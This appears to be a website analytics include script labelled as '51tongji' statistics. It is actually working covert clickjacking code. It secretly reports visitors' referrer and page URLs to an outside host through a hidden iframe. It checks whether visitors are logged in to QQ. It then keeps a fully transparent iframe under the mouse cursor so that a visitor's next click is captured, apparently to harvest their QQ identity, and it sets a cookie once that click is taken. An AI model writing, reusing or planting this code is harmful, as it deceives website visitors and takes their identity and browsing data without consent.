document.write("<iframe id=\"TX51tongji\" style=\"width: 80px;height:28px;position: absolute;filter:alpha(opacity=00);-moz-opacity:0.0;-khtml-opacity: 0.0;opacity: 0.0;display:none;\" frameborder=\"0\" scrolling=\"no\"></iframe>");
var TX51tongji_oHead = document.getElementsByTagName('HEAD').item(0);
var TX51tongji_ie = document.all ? true : false;

function skip() {
	if (document.getElementById('URL51tongji_iframe') == null) {
		var URL51tongji_xurl = 'http://yun.51tongji.cn/T-census.php?uin=111334';
		var URL51tongji_ref = encodeURIComponent(document.referrer);
		var URL51tongji_page = encodeURIComponent(document.location.href);
		var URL51tongji_url = URL51tongji_xurl + '&llurl='
				+ encodeURIComponent(URL51tongji_ref) + '&thepage='
				+ encodeURIComponent(URL51tongji_page) + '&t='
				+ new Date().getTime();
		var iframe = document.createElement("iframe");
		iframe.src = URL51tongji_url;
		iframe.id = "URL51tongji_iframe";
		iframe.name = "URL51tongji_iframe";
		iframe.style.width = "0px";
		iframe.style.height = "0px";
		iframe.scrolling = "no";
		iframe.setAttribute('frameborder', '0', 0);
		document.body.appendChild(iframe);
	}
}

function TX51tongjiCScritp(TX51tongji_id, TX51tongji_url, fun) {
	try {
		var is_e = document.getElementById(TX51tongji_id);
		if (is_e) {
			is_e.parentNode.removeChild(is_e)
		}
		var TX51tongji_qScript = document.createElement("script");
		TX51tongji_qScript.type = "text/javascript";
		TX51tongji_qScript.id = TX51tongji_id;
		TX51tongji_qScript.charset = "utf-8";
		if (TX51tongji_ie) {
			TX51tongji_qScript.onreadystatechange = function() {
				if (TX51tongji_qScript.readyState == "loaded"
						|| TX51tongji_qScript.readyState == "complete") {
					typeof fun != "undefined" && fun(TX51tongji_qScript)
				}
			}
		} else {
			TX51tongji_qScript.onload = function() {
				typeof fun != "undefined" && fun(TX51tongji_qScript)
			}
		}
		TX51tongji_qScript.src = TX51tongji_url;
		TX51tongji_oHead.appendChild(TX51tongji_qScript)
	} catch (e) {
	}
}
function TX51tongjiSetcookie(name, value) {
	var Days = 30;
	var exp = new Date();
	exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 7);
	document.cookie = name + "=" + escape(value) + ";expires="
			+ exp.toGMTString()
}
function TX51tongjiGetcookie(name) {
	var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
	if (arr = document.cookie.match(reg))
		return (arr[2]);
	else
		return null
}
function TX51tongjiCkQlogin() {
	var TX51tongjiCkQlogin_uri = "http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t="
			+ (new Date).getTime();
	TX51tongjiCScritp('TX51tongjiCkQlogin_id', TX51tongjiCkQlogin_uri,
			TX51tongjiCkQlogin_fn);
}
function TX51tongjiCkQlogin_fn() {
	if (data0.err == '1026') {
		TX51tongji_mt()
	}
}
function TX51tongji_mt() {
	if (TX51tongjiGetcookie('qtx51tongji') != null) {
		return false
	}
	var oTop = document.getElementById("TX51tongji");
	oTop.style.display = 'block';
	oTop.src = 'http://yun.51tongji.cn/qqtx.php';
	document.onmousemove = function(evt) {
		var oEvent = evt || window.event;
		var scrollleft = document.documentElement.scrollLeft
				|| document.body.scrollLeft;
		var scrolltop = document.documentElement.scrollTop
				|| document.body.scrollTop;
		oTop.style.left = oEvent.clientX - 30 + scrollleft + 10 + "px";
		oTop.style.top = oEvent.clientY - 20 + scrolltop + 10 + "px"
	}
}
var IframeOnClick = {
	resolution : 200,
	iframes : [],
	interval : null,
	Iframe : function() {
		this.element = arguments[0];
		this.cb = arguments[1];
		this.hasTracked = false
	},
	track : function(element, cb) {
		this.iframes.push(new this.Iframe(element, cb))
	},
	doit : function() {
		setInterval(function() {
			IframeOnClick.checkClick()
		}, this.resolution)
	},
	checkClick : function() {
		if (document.activeElement) {
			var activeElement = document.activeElement;
			for ( var i in this.iframes) {
				if (activeElement === this.iframes[i].element) {
					if (this.iframes[i].hasTracked == false) {
						this.iframes[i].cb.apply(activeElement, []);
						this.iframes[i].hasTracked = true
					}
				} else {
					this.iframes[i].hasTracked = false
				}
			}
		}
	}
};
IframeOnClick.track(document.getElementById('TX51tongji'), function() {
	setTimeout(function() {
		document.getElementById('TX51tongji').style.display = 'none';
		TX51tongjiSetcookie('qtx51tongji', 1);
	}, 500)
});
IframeOnClick.doit();
TX51tongjiCkQlogin();
skip();